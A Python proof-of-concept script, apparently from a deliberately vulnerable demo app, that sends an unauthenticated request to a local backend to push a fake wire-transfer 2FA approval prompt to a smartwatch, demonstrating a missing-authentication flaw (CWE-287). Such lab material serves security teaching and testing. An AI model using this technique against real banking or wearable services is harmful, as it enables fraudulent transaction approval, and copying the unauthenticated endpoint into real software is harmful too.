#!/usr/bin/env python3
"""
trigger_2fa_push.py - Simulate High-Value 2FA Wire Transfer Push (V-AP04)
Dispatches an unauthenticated out-of-band wire transfer prompt to Nexora OmniWear Apple Watch.

Usage:
    python scripts/trigger_2fa_push.py [amount_idr] [recipient] [backend_url]
Example:
    python scripts/trigger_2fa_push.py 50000000 "Evelyn Sterling (NX-7391048)" http://127.0.0.1:5000
"""

import sys
import json
import urllib.request
import urllib.error

def main():
    amount = float(sys.argv[1]) if len(sys.argv) > 1 else 50000000.0
    recipient = sys.argv[2] if len(sys.argv) > 2 else "Evelyn Sterling (NX-7391048)"
    backend = sys.argv[3] if len(sys.argv) > 3 else "http://127.0.0.1:5000"

    endpoint = f"{backend.rstrip('/')}/api/wearable/dispatch"
    payload = {
        "target_device_id": "watch_apple_01",
        "action": "TRIGGER_2FA",
        "payload": {
            "tx_id": "TX-9921",
            "amount": amount,
            "recipient": recipient
        }
    }

    print("=" * 65)
    print("  NEXORA OMNIWEAR 2FA WIRE TRANSFER PUSH DISPATCHER (V-AP04)")
    print("=" * 65)
    print(f"[*] Target Endpoint : {endpoint}")
    print(f"[*] Wire Amount     : Rp {amount:,.0f}")
    print(f"[*] Recipient       : {recipient}")
    print(f"[*] Target Device   : watch_apple_01 (Apple Watch Ultra / Series 8)")
    print("=" * 65)

    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(endpoint, data=data, headers={"Content-Type": "application/json"}, method="POST")

    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            resp_data = json.loads(res.read().decode("utf-8"))
            print(f"[✓] SUCCESS (HTTP {res.status}): Event Dispatched to Backend Queue!")
            print(f"    Event ID : {resp_data.get('event_id')}")
            print(f"    Action   : {resp_data.get('action')}")
            print("\n[👉 NEXT STEP ON APPLE WATCH]")
            print("  1. The watch will receive or poll the high-value 2FA wire prompt.")
            print("  2. TwoFactorApprovalView will appear with amount and recipient.")
            print("  3. Tap 'APPROVE' to demonstrate unauthenticated clearance (CWE-287).\n")
    except urllib.error.URLError as e:
        print(f"[✗] FAILED: Could not reach backend at {endpoint} -> {e}")

if __name__ == "__main__":
    main()
